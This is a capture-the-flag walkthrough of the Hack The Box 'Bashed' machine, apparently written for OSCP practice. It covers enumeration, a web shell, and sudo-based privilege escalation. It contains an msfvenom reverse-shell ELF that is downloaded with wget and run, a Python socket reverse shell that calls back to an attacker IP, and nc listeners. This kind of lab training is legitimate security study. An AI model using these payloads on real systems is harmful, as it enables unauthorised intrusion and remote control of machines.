## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP)

### Enumeration
Start with a full Nmap scan to identify open ports:
```bash
sudo nmap -sV -sC -sS -oA scan/result $IP
```
The results show only port **80 (HTTP)** is open.

### [HTTP](HTTP) Enumeration
Visiting the website reveals a PHP-based web application. To discover hidden paths:
```bash
gobuster dir --url "http://$IP" -w /usr/share/dirb/wordlists/small.txt
```
The `/dev/` directory contains accessible files — one allows command execution via the web.

Using this functionality, grab the user flag:
```bash
cat /home/arrexel/user.txt
```

### Privilege Escalation
Run `sudo -l` to identify available sudo privileges:
```bash
sudo -l
```
It reveals that we can run scripts as **scriptmanager** without a password.

List all files owned by **scriptmanager**:
```bash
find / -user scriptmanager -type f 2>/dev/null
```
A Python script in `/scripts/` is modifiable. We'll exploit it.

### Reverse Shell via ELF Payload
Generate a reverse shell payload:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f elf > exploit.elf
```
Serve it via Python:
```bash
python3 -m http.server 80
```
Download and execute it from the target:
```bash
cd /tmp
wget http://$YOUR_IP/exploit.elf
chmod +x exploit.elf
./exploit.elf
```
Start a listener:
```bash
nc -lvnp 9001
```
Once inside, stabilize the shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=screen
```

### Alternative Python Backdoor
Create `test.py`:
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$YOUR_IP",9002))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```
Upload and execute it using the writable script.

Start another listener:
```bash
nc -lvnp 9002
```
This grants a shell as **root**.

### Root
Retrieve the root flag:
```bash
cat /root/root.txt
```

---

🎉 Congrats, you rooted **HTB: Bashed**!

